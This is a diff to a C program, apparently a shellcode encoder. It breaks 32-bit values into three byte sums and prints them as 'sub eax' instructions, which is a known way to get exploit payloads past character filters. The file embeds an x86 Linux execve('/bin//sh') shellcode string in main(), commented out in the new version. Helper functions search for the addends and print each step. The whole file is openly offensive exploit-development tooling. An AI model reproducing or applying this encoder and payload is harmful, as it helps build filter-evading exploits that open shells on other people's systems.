@@ -4,9 +4,9 @@
 
 struct RESULT_BYTE {
 	int overflow; // 进位的个数
-	char a;
-	char b;
-	char c;
+	unsigned char a;
+	unsigned char b;
+	unsigned char c;
 };
 
 struct RESULT{
@@ -15,8 +15,8 @@ struct RESULT{
 	int result_c;
 };
 
-char *getMAX(char *a, char *b, char *c){
-	char *MAX = a;
+unsigned char *getMAX(unsigned char *a, unsigned char *b, unsigned char *c){
+	unsigned char *MAX = a;
 	if (*b > *MAX){
 		MAX = b;
 	}
@@ -26,8 +26,8 @@ char *getMAX(char *a, char *b, char *c){
 	return MAX;
 }
 
-char *getMIN(char *a, char *b, char *c){
-	char *MIN = a;
+unsigned char *getMIN(unsigned char *a, unsigned char *b, unsigned char *c){
+	unsigned char *MIN = a;
 	if (*b < *MIN){
 		MIN = b;
 	}
@@ -37,26 +37,26 @@ char *getMIN(char *a, char *b, char *c){
 	return MIN;
 }
 
-struct RESULT_BYTE * searchByte(char target, char LEFT, char RIGHT){
-	char LEFT_A = LEFT;
-	char RIGHT_A = RIGHT;
-	char a = LEFT_A + (RIGHT_A - LEFT_A) / 2;
+struct RESULT_BYTE * searchByte(unsigned char target, unsigned char LEFT, unsigned char RIGHT){
+	unsigned char LEFT_A = LEFT;
+	unsigned char RIGHT_A = RIGHT;
+	unsigned char a = LEFT_A + (RIGHT_A - LEFT_A) / 2;
 
-	char LEFT_B = LEFT;
-	char RIGHT_B = RIGHT;
-	char b = LEFT_B + (RIGHT_B - LEFT_B) / 2;
+	unsigned char LEFT_B = LEFT;
+	unsigned char RIGHT_B = RIGHT;
+	unsigned char b = LEFT_B + (RIGHT_B - LEFT_B) / 2;
 
-	char LEFT_C = LEFT;
-	char RIGHT_C = RIGHT;
-	char c = LEFT_C + (RIGHT_C - LEFT_C) / 2;
+	unsigned char LEFT_C = LEFT;
+	unsigned char RIGHT_C = RIGHT;
+	unsigned char c = LEFT_C + (RIGHT_C - LEFT_C) / 2;
 
 	int counter = 0;
 
 	while(counter++ < 0xFF){
 		// printf("[TIMES] : [%x]\t", counter);
 		// printf("[%d] [%d] [%d]\n", a, b, c);
-		char temp = (a + b + c) % 0x100; // 计算和
-		char *pointer;
+		unsigned char temp = (a + b + c) % 0x100; // 计算和
+		unsigned char *pointer;
 		if (temp > target){
 			pointer = getMAX(&a, &b, &c);	
 			*pointer = *pointer + 1;
@@ -80,10 +80,10 @@ struct RESULT_BYTE * searchByte(char target, char LEFT, char RIGHT){
 struct RESULT * search(int target){
 	
 	struct RESULT * result = malloc(sizeof(struct RESULT));
-	char byte_l = (target >> 0) % 0x100;
-	char byte_ml = (target >> 8) % 0x100;
-	char byte_mh = (target >> 16) % 0x100;
-	char byte_h = (target >> 24) % 0x100;
+	unsigned char byte_l = (target >> 0) % 0x100;
+	unsigned char byte_ml = (target >> 8) % 0x100;
+	unsigned char byte_mh = (target >> 16) % 0x100;
+	unsigned char byte_h = (target >> 24) % 0x100;
 	int overflow = 0;
 
 	struct RESULT_BYTE * result_byte = NULL;
@@ -124,27 +124,75 @@ struct RESULT * search(int target){
 	return result;
 }
 
-char * build(char *shellcode){
+unsigned char * build(unsigned char *shellcode){
 	int length = (strlen(shellcode) / 4 + 1) * 4;
-	printf("[RESULT_LENGTH] : %d", length);
-	char *result = malloc(length); // 假设 shellcode 已经去掉了 0 字节
+	printf("[RESULT_LENGTH] : %d\n", length);
+	unsigned char *result = malloc(length); // 假设 shellcode 已经去掉了 0 字节
+	memset(result, 0, length);
+	//int i = 0;
+	/*
+	// 复制
+	for (i = 0; i < strlen(shellcode); i++){
+		result[length - i] = 0x100000000 - shellcode[strlen(shellcode) - i];	
+	}
+	// 开始搜索
+	for (i = 0; i < length; i += 4){
+		int *target = (int *)&result[i];
+		printf("[Begin] ==> [0x%8x]\n", *target);
+		struct RESULT * result = search(*target);
+		printf("sub %xH\nsub %xH\nsub %xH\n", result->result_a, result->result_b, result->result_c);
+		printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
+		free(result);
+		
+	}
+	*/
+
 	return result;
 }
 
+char * create(char * shellcode){
+		int length = (strlen(shellcode) / 4 + 1) * 4;
+		int i = 0;
+		unsigned int *target = NULL;
+		for (i = 0; i < strlen(shellcode); i += 4 ){
+				target = (int *)&shellcode[i];
+				printf("[Target] : %x\n", *target);
+					
+			struct RESULT * result = search(*target);
+			printf("[Target] : 0x%x\n", *target);
+			printf("[FOUND] : \n");
+			printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
+			printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
+			free(result);
+		}
+
+
+
+}
+
 int main(){
-	char *shellcode = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"; // length = 21
-	char *result = build(&shellcode);
+	// unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80"; // length = 21
+	//unsigned char shellcode[] = "\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\x99\xcd\x80\x00\x00\x00"; // length = 21
+	//unsigned char * result = create(shellcode);
 
 		
-/*		
-	int target = 0x12345678;
-	printf("[Target] : 0x%x\n", target);
+
+	// int target = 0xa7663280;
+//	int target = 0x761c95f5;
+//	int target = 0xd09d9692;
+//	 int target = 0xd08c9798;
+//	 int target = 0x36ae97d1;
+//	 int target = 0x6f6f6fcf;
+	 int target = 0x6f6f6f70;
+
 	struct RESULT * result = search(target);
+	printf("[Target] : 0x%x\n", target);
 	printf("[FOUND] : \n");
 	printf("[0x%x] [0x%x] [0x%x]\n", result->result_a, result->result_b, result->result_c);
 	printf("0x%x + 0x%x + 0x%x\n", result->result_a, result->result_b, result->result_c);
+	printf("sub eax, %xH\nsub eax, %xH\nsub eax, %xH\n", result->result_a, result->result_b, result->result_c);
 	free(result);
-*/
+
 }
 
 // 产生一个问题 :
